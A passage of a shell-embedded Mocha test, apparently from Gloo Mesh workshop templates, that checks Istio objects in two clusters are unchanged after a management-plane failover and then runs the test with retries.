  } else {
    done();
  }
});

const compare = (originalFileName, finalFileName) => {
  const original = JSON.parse(fs.readFileSync(originalFileName, 'utf8'));
  const final = JSON.parse(fs.readFileSync(finalFileName, 'utf8'));

  const result = jsonDiff.diff(original, final, { excludeKeys: ["metadata"] });
  return result;
}

describe("failover has no impact", () => {
  it("Istio objects haven't been modified in cluster1", () => {
    const result = compare('cluster1_original', 'cluster1_final');
    expect(result).to.be.undefined;
  });
  it("Istio objects haven't been modified in cluster2", () => {
    const result = compare('cluster2_original', 'cluster2_final');
    expect(result).to.be.undefined;
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/gloo-mesh-mgmt-failover/tests/failover-has-no-impact.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



